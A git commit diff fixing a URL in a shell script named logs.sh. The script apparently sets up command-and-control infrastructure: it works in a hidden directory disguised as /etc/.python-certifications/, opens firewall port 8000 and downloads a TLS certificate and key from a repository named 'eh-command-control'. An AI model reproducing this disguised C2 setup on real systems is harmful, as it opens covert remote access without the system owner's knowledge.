af6a4c660ebdc3a9cc70bb1001638ccbe014536a
Nidhi Pabbathi <123031844+npabbathi@users.noreply.github.com>
2026-03-26 19:06:55 -0500

    Correct cert.pem download URL
    Fix URL for downloading cert.pem in logs.sh

--- logs.sh
+++ logs.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 cd /etc/.python-certifications/
 firewall-cmd --add-port=8000/tcp
-curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/raw/refs/heads/main/cert.pem -o cert.pem
+curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/cert.pem -o cert.pem
 
 curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/key.pem -o key.pem
   
